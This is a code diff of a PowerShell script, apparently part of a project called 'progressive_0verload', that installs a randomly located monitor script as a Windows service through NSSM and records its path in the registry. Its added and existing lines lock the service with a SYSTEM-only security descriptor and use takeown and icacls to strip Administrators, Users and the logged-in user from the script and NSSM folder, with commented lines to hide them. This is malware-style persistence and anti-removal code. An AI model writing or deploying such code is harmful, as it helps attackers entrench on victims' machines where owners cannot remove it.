@@ -12,6 +12,7 @@ $paths = @(
 )
 $curr = $MyInvocation.MyCommand.Path
 $arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
+$propertyName = "rootMonMon"
 
 # $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
 if($arch -eq "64-bit"){
@@ -30,6 +31,12 @@ if(($rootPath -eq $null) -or ($rootPath -eq "")){
 
 $scriptPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $scriptPath = "$scriptPath\root_mon_mon.ps1"
+$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+if($item){
+    $scriptPath = $item.$propertyName
+}else{
+    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $scriptPath -Force
+}
 
 $serviceName = "MyRootmonmonService"
 $exepath = "powershell.exe"
@@ -71,22 +78,42 @@ $user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
 $SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
 sc.exe sdset $serviceName $SDDL
 
-takeown /F $scriptPath
-icacls $scriptPath /inheritance:r /Q 
-icacls $scriptPath /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /Q 
-icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 
-icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
-icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
-icacls $scriptPath /remove "$user" /Q 
+if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM'){
+    takeown /F $scriptPath 
+    icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 
+    icacls $scriptPath /inheritance:r /Q 
+    icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /Q 
+    icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
+    icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
+    icacls $scriptPath /remove "$user" /Q 
+    
+    
+    takeown /F $nssmFolder /R /D Y 
+    icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 
+    icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 
+    icacls $nssmFolder /inheritance:r /T /Q 
+    icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 
+    icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 
+    icacls $nssmFolder /remove "$user" /T /Q 
 
-
-takeown /F $nssmFolder /R /D Y
-icacls $nssmFolder /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /T /Q
-icacls $nssmFolder /inheritance:r /T /Q
-icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 
-icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 
-icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 
-icacls $nssmFolder /remove "$user" /T /Q
+}else{
+    takeown /F $scriptPath
+    icacls $scriptPath /inheritance:r /Q 
+    icacls $scriptPath /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /Q 
+    icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 
+    icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
+    icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
+    icacls $scriptPath /remove "$user" /Q 
+    
+    
+    takeown /F $nssmFolder /R /D Y
+    icacls $nssmFolder /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /T /Q
+    icacls $nssmFolder /inheritance:r /T /Q
+    icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 
+    icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 
+    icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 
+    icacls $nssmFolder /remove "$user" /T /Q
+}
 
 #attrib +h +s +r $nssmFolder 2>&1 | Out-Null
 #attrib +h +s +r $scriptPath
